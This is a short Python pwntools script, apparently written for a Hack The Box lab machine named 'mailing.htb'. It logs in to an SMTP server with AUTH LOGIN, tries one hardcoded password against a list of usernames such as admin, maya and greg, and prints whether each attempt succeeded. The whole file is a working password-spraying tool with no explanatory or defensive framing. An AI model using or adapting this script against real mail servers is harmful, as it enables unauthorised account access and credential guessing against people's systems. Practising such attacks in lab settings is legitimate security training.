from pwn import *
import base64

context.log_level = 'debug'

host = '10.129.222.77'
domain = b'mailing.htb'
port = 25

def try_login(username, password):
    conn = remote(host, port)
    conn.recvline()

    conn.sendline(b'HELO mailing.htb\r')
    conn.recvline()

    conn.sendline(b'AUTH LOGIN\r')
    conn.recvline()

    username = base64.b64encode(username + b'@' + domain)
    password = base64.b64encode(password)

    conn.sendline(username + b'\r')
    conn.recvline()

    conn.sendline(password + b'\r')
    resp = conn.recvline()

    if b'535 Authentication failed.' in resp:
        print('[FAILED]')
        return False
    print('[SUCCESS]')
    return True

def loop_login(usernames, password):
    for username in usernames:
        r = try_login(username, password)
        if r: exit()

if __name__ == '__main__':
    username = b'admin'
    password = b'homenetworkingadministrator'
    # try_login(username, password)
    usernames = [
        b'admin',
        b'administrator',
        b'maya',
        b'ruy',
        b'greg',
        #b'gregory',
        #b'ralonso',
        #b'gsmith',
        #b'mbendito'
        ]

    loop_login(usernames, password)